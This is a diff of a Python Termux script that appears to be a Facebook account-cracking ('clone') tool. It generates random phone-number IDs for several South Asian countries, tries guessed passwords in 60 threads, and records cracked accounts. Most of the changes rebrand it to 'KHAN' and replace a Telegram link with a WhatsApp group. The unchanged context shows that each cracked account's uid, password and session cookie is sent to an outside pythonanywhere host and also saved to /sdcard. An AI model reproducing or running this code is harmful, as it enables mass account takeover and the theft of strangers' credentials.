@@ -40,8 +40,8 @@ try:
     import mechanize
 except ModuleNotFoundError:
     os.system('pip install mechanize')
-sys.stdout.write("\x1b]2; ZER0-XD\x07")
-#kkkk[ COLORS ]kkkk#
+sys.stdout.write("\x1b]2; KHAN\x07")
+#====[ COLORS ]====#
 ###----------[ PEH ]----------##
 orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m";faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 mer = '\033[1;31m'
@@ -166,7 +166,7 @@ try:
 except Exception as e:
         print("Error retrieving device information:", e)
 simcard=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').splitlines()
-#k¬k­k¬k­k¬k­k¬k­[PERMISSION OF SDCARD]k¬k­k¬k­k¬k­k¬k­#
+#=¬=­=¬=­=¬=­=¬=­[PERMISSION OF SDCARD]=¬=­=¬=­=¬=­=¬=­#
 def sexy():   
     oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
     redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
@@ -328,7 +328,7 @@ def ____banner____():
     if "win" in sys.platform:os.system("cls")
     else:os.system("clear")
     print(f"""  \033[1;36m
-  ┌──────────────────────────────────┐
+ ┌─────────────────────────────────┐
 │      _    _                      │
 │     | |  | |                     │
 │     | | _| |__   __ _ _ __       │
@@ -344,16 +344,16 @@ def ____banner____():
 {rad}[{white}-{rad}] {green}VERSION \033[38;5;196m  :\x1b[38;1;97m Testing 
 {rad}[{white}-{rad}] {green}TOOLS \033[38;5;196m    :\x1b[38;1;97m FREE
 {rad}[{white}-{rad}] {green}THIS TOOL FILE & RANDOM TYPES
-{puti}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk""")
+{puti}========================================""")
 
 def fuckxd():
     os.system('clear')
     ____banner____()
-#kkkk[ LINE ]kkkk#
+#====[ LINE ]====#
 def line():
-    print(f'{white}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk')
+    print(f'{white}==================================================')
 def linex():
-    print(f'{white}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk')
+    print(f'{white}==================================================')
 #-------------------[LOCATION CHECK]-------------------#
 """uxernamx = sys.argv[0]
 if uxernamx=='GREEN.py':
@@ -389,7 +389,7 @@ class Process:
             input("\033[97;1m[\033[92;1mk¢\033[97;1m]\33[0;92m Press Enter To Send Key")
             time.sleep(3.5)
             tks = 'TOKEN KEY =%20%20:%20'+self.key
-            os.system('am start hhttps://t.me/KGF_TERMUX_TEAM?text=' + tks)
+            os.system('am start https://chat.whatsapp.com/E9p8RtU0Duz4hs7YWjnSbX?text=' + tks)
             exit()
     def clear(self):os.system('clear');____banner____()
     def Gex(self,x):
@@ -404,7 +404,7 @@ class Process:
     def enroll(self):
         khan()
 
-#kkkk[ MAIN ]kkkk#
+#====[ MAIN ]====#
 def khan():
     ____banner____()
     print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}] {green}KEEP ON FILE CLONE')
@@ -412,12 +412,12 @@ def khan():
     print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}] {green}KEEP ON RANDOM CLONE')
     print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}] {green}JOIN GROUP')
     print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}] {green}CONTRACK ADMIN');linex()
-    __khan__ = input(f'{rad}[{white}-{rad}] {green}Selection  {white}k¶ï¸ {yelloww}')
+    __khan__ = input(f'{rad}[{white}-{rad}] {green}Selection  {white}: {yelloww}')
     if __khan__ in ['A','a','01','1']:__FILEX__()
     elif __khan__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
     elif __khan__ in ['C','c','03','3']:___RANDOM___()
-    elif __khan__ in ['D','d','04','4']:os.system("xdg-open https://t.me/KGF_TERMUX_TEAM")
-    elif __khan__ in ['E','e','05','5']:os.system("xdg-open https://t.me/KGF_TERMUX_TEAM")
+    elif __khan__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/E9p8RtU0Duz4hs7YWjnSbX")
+    elif __khan__ in ['E','e','05','5']:os.system("xdg-open https://chat.whatsapp.com/E9p8RtU0Duz4hs7YWjnSbX")
     else:print(f'\n[Ã]{rad} Choose Value Option... ');khan()
 
 #====================[RANDOM MENU]==========================
@@ -458,20 +458,20 @@ def ___RANDOM___():
 #====================[BD RANDOM]==========================
 def ___BD___():
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}SIM CODES {white}k¶ï¸ {red}[{white}018 017 016 013{red}]');line()
-    code = input(f'{red}[{white}k{red}]{green} Choice    {white}k¶ï¸ {yellow}')
+    print(f'{red}[{white}k{red}] {green}SIM CODES {white}: {red}[{white}018 017 016 013{red}]');line()
+    code = input(f'{red}[{white}k{red}]{green} Choice    {white}: {yellow}')
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  k¶ï¸ {red}[{white}10000 20000 30000{red}]');line()
-    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}k¶ï¸ \x1b[38;5;208m'))
+    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  : {red}[{white}10000 20000 30000{red}]');line()
+    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}: \x1b[38;5;208m'))
     line()
     plist = []
     ____banner____()
     print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
-    mtd=input(f"\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    mtd=input(f"\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m: \x1b[38;5;208m")
     ____banner____()
     print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
     print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
-    __CH__ = input(f"\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    __CH__ = input(f"\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m: \x1b[38;5;208m")
     if __CH__ in ["A","a","1"]:
         plist.append('first6')
         plist.append('last6')
@@ -485,11 +485,11 @@ def ___BD___():
         
     elif __CH__ in ["B","b","2"]:
         ____banner____()
-        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}k¶ï¸ {red}'));line()
+        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}: {red}'));line()
         print(f"{red}[{white}k{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO-{i+1} {white}k¶ï¸ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO-{i+1} {white}: \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -523,19 +523,19 @@ def ___BD___():
 #====================[INDIA RANDOM]==========================
 def ___INDIA___():
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}SIM CODES{white} k¶ï¸ {red}[{white}9832 8653 6253 7423{red}]');line()
-    code = input(f'{red}[{white}k{red}]{green} Choice    {white}k¶ï¸ \x1b[38;5;208m')
+    print(f'{red}[{white}k{red}] {green}SIM CODES{white} : {red}[{white}9832 8653 6253 7423{red}]');line()
+    code = input(f'{red}[{white}k{red}]{green} Choice    {white}: \x1b[38;5;208m')
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  k¶ï¸ {red}[{white}10000 20000 30000{red}]');line()
-    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}k¶ï¸ \x1b[38;5;208m'))
+    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  : {red}[{white}10000 20000 30000{red}]');line()
+    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}: \x1b[38;5;208m'))
     line()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
-    ___STM___=input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    ___STM___=input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     line()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
     print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
     plist = []
-    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     if __CH__ in ["A","a","1"]:       
         plist.append('first6')
         plist.append('last6')
@@ -544,11 +544,11 @@ def ___INDIA___():
         plist.append('first8')
         plist.append('last8')
     elif __CH__ in ["B","b","2"]:
-        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}k¶ï¸ \x1b[38;5;208m'));line()
+        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}: \x1b[38;5;208m'));line()
         print(f"{red}[{white}k{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}k¶ï¸ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}: \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
@@ -576,18 +576,18 @@ def ___INDIA___():
 #====================[MALAYSIA RANDOM]==========================
 def ___ML___():
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}SIM CODES {white}k¶ï¸ {red}[{white}01125 01128 01137 01161{red}]');line()
-    code = input(f'{red}[{white}k{red}]{green} Choice    {white}k¶ï¸ \x1b[38;5;208m')
+    print(f'{red}[{white}k{red}] {green}SIM CODES {white}: {red}[{white}01125 01128 01137 01161{red}]');line()
+    code = input(f'{red}[{white}k{red}]{green} Choice    {white}: \x1b[38;5;208m')
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  k¶ï¸ {red}[{white}10000 20000 30000{red}]');line()
-    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}k¶ï¸ \x1b[38;5;208m'))
+    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  : {red}[{white}10000 20000 30000{red}]');line()
+    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}: \x1b[38;5;208m'))
     line()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
-    mtd=input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    mtd=input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     plist = []
     print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
     print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
-    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     if __CH__ in ["A","a","1"]:
         plist.append('first6')
         plist.append('last6')
@@ -598,11 +598,11 @@ def ___ML___():
         plist.append('Sri Lanka')
         plist.append('srilanka')
     elif __CH__ in ["B","b","2"]:
-        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}k¶ï¸ \x1b[38;5;208m'));line()
+        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}: \x1b[38;5;208m'));line()
         print(f"{red}[{white}k{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}k¶ï¸ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}: \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
@@ -635,20 +635,20 @@ def ___ML___():
 #====================[PAKISTAN RANDOM]==========================
 def ___PK___():
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}SIM CODES {white}k¶ï¸ {red}[{white}0315 0345 0333{red}]');line()
-    code = input(f'{red}[{white}k{red}]{green} Choice    {white}k¶ï¸ \x1b[38;5;208m')
+    print(f'{red}[{white}k{red}] {green}SIM CODES {white}: {red}[{white}0315 0345 0333{red}]');line()
+    code = input(f'{red}[{white}k{red}]{green} Choice    {white}: \x1b[38;5;208m')
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  k¶ï¸ {red}[{white}10000 20000 30000{red}]');line()
-    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}k¶ï¸ \x1b[38;5;208m'))
+    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  : {red}[{white}10000 20000 30000{red}]');line()
+    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}: \x1b[38;5;208m'))
     line()
     plist = []
     ____banner____()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
-    mtd=input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    mtd=input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     ____banner____()
     print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
     print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
-    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     if __CH__ in ["A","a","1"]:
         plist.append('first6')
         plist.append('last6')
@@ -667,11 +667,11 @@ def ___PK___():
         plist.append('203040')
     elif __CH__ in ["B","b","2"]:
         ____banner____()
-        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}k¶ï¸ \x1b[38;5;208m'));line()
+        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}: \x1b[38;5;208m'));line()
         print(f"{red}[{white}k{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}k¶ï¸ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}: \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -705,20 +705,20 @@ def ___PK___():
  #====================[NEPAL RANDOM]==========================
 def ___NP___():
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}SIM CODES {white}k¶ï¸ {red}[{white}+977 ETC.{red}]');line()
-    code = input(f'{red}[{white}k{red}]{green} Choice    {white}k¶ï¸ \x1b[38;5;208m')
+    print(f'{red}[{white}k{red}] {green}SIM CODES {white}: {red}[{white}+977 ETC.{red}]');line()
+    code = input(f'{red}[{white}k{red}]{green} Choice    {white}: \x1b[38;5;208m')
     ____banner____()
-    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  k¶ï¸ {red}[{white}10000 20000 30000{red}]');line()
-    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}k¶ï¸ \x1b[38;5;208m'))
+    print(f'{red}[{white}k{red}] {green}EXAMPLE {white}  : {red}[{white}10000 20000 30000{red}]');line()
+    limit = int(input(f'{red}[{white}k{red}] {green}LIMITS    {white}: \x1b[38;5;208m'))
     line()
     plist = []
     ____banner____()
     print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
-    mtd=input(f"\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    mtd=input(f"\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     ____banner____()
     print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
     print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD {red}(BEST)");line()
-    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37mk¶ï¸ \x1b[38;5;208m")
+    __CH__ = input("\x1b[38;5;160m[\033[1;37mk\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m: \x1b[38;5;208m")
     if __CH__ in ["A","a","1"]:
         plist.append('first6')
         plist.append('last6')
@@ -728,11 +728,11 @@ def ___NP___():
         plist.append('last8')
     elif __CH__ in ["B","b","2"]:
         ____banner____()
-        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}k¶ï¸ \x1b[38;5;208m'));line()
+        psl = int(input(f'{red}[{white}k{red}] {green}INPUT PASS LIMITS {white}: \x1b[38;5;208m'));line()
         print(f"{red}[{white}k{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
         line()
         for i in range(psl):
-            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}k¶ï¸ \x1b[38;5;208m'));line()
+            plist.append(input(f'{red}[{white}k{red}] {green}PASSWORD NO.{i+1} {white}: \x1b[38;5;208m'));line()
     for x in range(limit):
         nmp = "". join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
@@ -1063,12 +1063,12 @@ def randm3(ids,psd,tl):
                     print(f"\r\r{red}[{white}k{red}] {red}[{green}COOKIE{red}]{green} ={white} {ckkk}")
                     requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{ckkk}")
                     oks.append(uid)
-                    open('/sdcard/zer0-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
+                    open('/sdcard/khan-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                     break
                 else:pass
             if 'checkpoint' in log_cookies:
                 #print(f"\r\r{red}[{white}k{red}] {red}DIE {uid} | {pas} ")
-                open('/sdcard/zer0-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/khan-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
@@ -1083,22 +1083,22 @@ def randm3(ids,psd,tl):
 def __FILEX__():
     global oks,cps
     ____banner____()
-    dfile = input(f'{rad}[{white}-{rad}] {green}EXAMPLE {rad}[{white}/sdcard/khan.txt{rad}]\n{rad}[{white}-{rad}] {green}INPUT FILE PATH {white}k¶ï¸ {yelloww}');linex()
+    dfile = input(f'{rad}[{white}-{rad}] {green}EXAMPLE {rad}[{white}/sdcard/khan.txt{rad}]\n{rad}[{white}-{rad}] {green}INPUT FILE PATH {white}: {yelloww}');linex()
     try:
         dx = open(dfile,'r').read().splitlines()
     except FileNotFoundError:
         print(f'{rad}[Ã] FILE NOT FOUND...');time.sleep(1);__FILEX__()
     dplist = []
     try:
-        pass_lmit = int(input(f'{rad}[{white}-{rad}] {green}INPUT PASS LIMITS {white}k¶ï¸ {yelloww}'));linex()
+        pass_lmit = int(input(f'{rad}[{white}-{rad}] {green}INPUT PASS LIMITS {white}: {yelloww}'));linex()
     except:
         pass_lmit = 3
     for i in range(pass_lmit):
-        dplist.append(input(f'{rad}[{white}-{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}-{rad}] {green}PASSWORD k¡ {i+1} {white}k¶ï¸ {yelloww}'));linex()
-    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk\n{rad}[{white}-{rad}] {green}SELECTION {white}k¶ï¸ {yelloww}");os.system('clear')
+        dplist.append(input(f'{rad}[{white}-{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}-{rad}] {green}PASSWORD k¡ {i+1} {white}: {yelloww}'));linex()
+    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk\n{rad}[{white}-{rad}] {green}SELECTION {white}: {yelloww}");os.system('clear')
     with ThreadPool(max_workers=60) as khan:
         ____banner____();total_ids = str(len(dx))
-        print(f'{rad}[{white}-{rad}] {green}TOTAL IDS  {white}k¶ï¸ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}k¶ï¸ \x1b[38;5;38m{__METHOD__}')
+        print(f'{rad}[{white}-{rad}] {green}TOTAL IDS  {white}: \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}: \x1b[38;5;38m{__METHOD__}')
         print(f'{rad}[{white}-{green}] TURN ON/OFF AIRPLANE MODE {rong}k{rong2}k{rong3}k{rong4}k{rong5}k{rong6}k{rong7}k' )
         linex()
         for user in dx:
